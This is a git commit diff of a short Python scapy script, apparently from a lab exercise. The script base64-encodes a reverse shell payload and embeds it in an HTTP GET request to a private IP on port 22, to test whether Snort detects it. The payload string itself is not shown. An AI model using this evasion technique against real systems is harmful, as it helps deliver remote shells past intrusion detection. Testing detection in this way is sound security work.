1a23efdea8ce7999c7568add4087da8130633deb
Anders <a-tunglan@hotmail.com>
2024-11-13 11:01:00 +0100

    created obfuscating script

--- obfuscating_attack_payloads/obfuscating.py
+++ obfuscating_attack_payloads/obfuscating.py
@@ -2,7 +2,7 @@ from scapy.all import IP, TCP, send
 
 # Define the target IP and port
 target_ip = "192.168.64.11"
-target_port = 22 # Does not really make much sense to do this agains 22 but its to see if snort will detect it
+target_port = 22 # Does not really make much sense but its to see if snort will detect it
 
 # Create an obfuscated malicious reverse shell payload by using a different encoding
 import base64
@@ -11,8 +11,8 @@ encoded_payload = base64.b64encode(reverse_shell.encode()).decode()
 print(encoded_payload)
 
 # Craft the HTTP GET request with the encoded payload embedded in a parameter
-http_request = f"GET /?data={reverse_shell} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
-# http_request = f"GET /?data={encoded_payload} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
+# http_request = f"GET /?data={reverse_shell} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
+http_request = f"GET /?data={encoded_payload} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
 
 # Create the TCP packet
 packet = IP(dst=target_ip) / TCP(dport=target_port, flags="PA") / http_request
